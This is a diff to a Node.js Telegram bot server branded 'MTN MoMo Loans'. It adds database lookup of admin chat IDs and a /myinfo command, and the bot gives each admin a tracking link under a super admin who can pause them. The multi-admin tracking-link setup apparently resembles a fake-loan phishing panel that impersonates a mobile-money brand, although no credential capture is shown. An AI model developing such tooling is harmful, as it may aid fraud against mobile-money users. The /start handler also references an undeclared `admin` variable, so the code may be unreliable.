@@ -1,3 +1,7 @@
+// ==========================================
+// UPDATED server.js WITH DATABASE INTEGRATION
+// ==========================================
+
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
@@ -236,9 +240,19 @@ function setupCommandHandlers() {
     // /start
     bot.onText(/\/start/, async (msg) => {
         const chatId  = msg.chat.id;
-        const adminId = getAdminIdByChatId(chatId);
+        let adminId = getAdminIdByChatId(chatId);
 
         try {
+            // Auto-link chat ID if not in memory but exists in database for this chatId
+            if (!adminId) {
+                const admins = await db.getAllAdmins();
+                const matchedAdmin = admins.find(a => String(a.chatId) === String(chatId));
+                if (matchedAdmin) {
+                    adminId = matchedAdmin.adminId;
+                    adminChatIds.set(adminId, chatId);
+                }
+            }
+
             if (adminId) {
                 if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                     await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\nYour access is temporarily paused.`, { parse_mode: 'Markdown' });
@@ -249,7 +263,7 @@ function setupCommandHandlers() {
                 const isSuperAdmin = adminId === 'ADMIN001';
 
                 let message = `
-👋 *Welcome ${admin.name} (MTN MoMo Loans)!*
+👋 *Welcome ${admin?.name || 'Admin'} (MTN MoMo Loans)!*
 
 *Your Admin ID:* \`${adminId}\`
 *Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
@@ -282,7 +296,6 @@ Provide this to your super admin to get access.
         const adminId = getAdminIdByChatId(chatId);
         if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
         if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
-        const admin = await db.getAdmin(adminId);
         bot.sendMessage(chatId, `🔗 *YOUR LINK*\n\`${WEBHOOK_URL}?admin=${adminId}\``, { parse_mode: 'Markdown' });
     });
 
@@ -337,7 +350,20 @@ Provide this to your super admin to get access.
         bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
     });
 
-    // Additional management admin commands omitted for brevity, keeping core flow setup below.
+    // /myinfo
+    bot.onText(/\/myinfo/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        const admin = await db.getAdmin(adminId);
+        bot.sendMessage(chatId, `
+👤 *ADMIN INFO*
+Name: ${admin?.name || 'N/A'}
+ID: \`${adminId}\`
+Chat ID: \`${chatId}\`
+Status: ${admin?.status || 'active'}
+        `, { parse_mode: 'Markdown' });
+    });
 }
 
 // ==========================================
